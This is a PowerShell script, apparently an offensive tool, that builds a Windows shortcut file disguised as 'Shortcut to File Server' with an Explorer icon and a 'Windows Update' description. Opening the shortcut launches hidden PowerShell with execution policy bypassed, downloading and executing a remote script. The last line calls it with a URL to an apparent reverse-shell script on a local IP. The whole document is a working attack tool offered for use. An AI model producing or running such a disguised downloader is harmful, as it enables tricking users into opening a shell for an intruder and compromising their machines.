function Out-Shortcut
{

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $PayloadURL,

        
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\Shortcut to File Server.lnk",

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $HotKey = 'F5',


        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $Icon='explorer.exe'




    )
    if(!$Payload)
    {
        $Payload = " -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($OutputPath)
    $Shortcut.TargetPath = $Executable
    $Shortcut.Description = "Shortcut to Windows Update Commandline"
    $Shortcut.WindowStyle = 7
    $Shortcut.Hotkey = $HotKey
    $Shortcut.IconLocation = "$Icon,0"
    $Shortcut.Arguments = $Payload
    $Shortcut.Save()
    Write-Output "The Shortcut file has been written as $OutputPath"

}

Out-Shortcut -PayloadURL http://10.0.0.233/mini-reverse.ps1